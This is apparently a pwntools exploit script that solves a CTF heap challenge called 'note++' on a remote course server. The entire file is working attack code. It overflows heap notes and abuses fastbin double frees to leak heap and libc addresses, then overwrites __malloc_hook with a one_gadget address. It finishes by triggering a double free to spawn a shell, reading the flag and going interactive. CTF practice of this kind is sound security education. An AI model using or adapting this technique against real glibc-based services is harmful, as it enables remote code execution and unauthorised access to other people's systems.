_loc = False

from pwn import *
context(arch = 'amd64', os = 'linux')
r = process('./note++') if _loc else remote('edu-ctf.csie.org', 10181)
def add( size, overflow, word ):
	r.sendafter('> ','1')
	r.sendafter('Size: ', str(size))
	r.sendafter('Note: ', word)
	r.sendafter('note: ', '.'*48 if overflow else '.\n')
def get( index ):
	r.sendafter('> ','2')
	r.recvuntil('Note ' + str(index) + ':\n  Data: ')
	return u64( r.recv(6) + b'\0\0' )
def dlt( index ):
	r.sendafter('> ','3')
	r.sendafter('Index: ', str(index))

add(0x10, False, '0')
add(0x10, False, '1')
add(0x70, False, '2')
add(0x70, False, '3')
add(0x70, False, '4')
add(0x70, False, '5')
add(0x60, False, '6')
add(0x60, False, '7')
dlt(6)
dlt(7)
dlt(5)
dlt(4)
dlt(2)
dlt(3)
dlt(1)
add(0x10, True, '1')
heap = get(2) - 0x140
success( "heap: "+ hex(heap) )
dlt(2)
# fast[0x80]->2->3->2->4->NULL
# fast[0x70]->7->6->NULL

dlt(0)
dlt(1)
add(0x70, False, p64(heap + 0xc0 + 0x10) )		#0
add(0x70, True, flat(0, 0x81) )					#1
add(0x70, True, '0')							#3
add(0x70, True, b'\0'*0x60 + flat(0, 0x101) )	#5
dlt(4)
# free a chunck of size 0x100
dlt(3)
add(0x70, True, '3')
libc = get(4) - 0x3c4b78
success( "libc: "+ hex(libc) )

malloc_hook = libc + 0x3c4b10
one_gadget = libc + 0xf02a4
dlt(6)
# fast[0x70]->6->7->6->NULL
add(0x60, False, p64(malloc_hook -0x10 -3) )
add(0x60, False, '.')
add(0x60, False, '.')
add(0x60, False, b'\0\0\0' + p64(one_gadget) )

dlt(4) # trigger double free
r.sendline('cat /home/`whoami`/flag')
r.interactive()
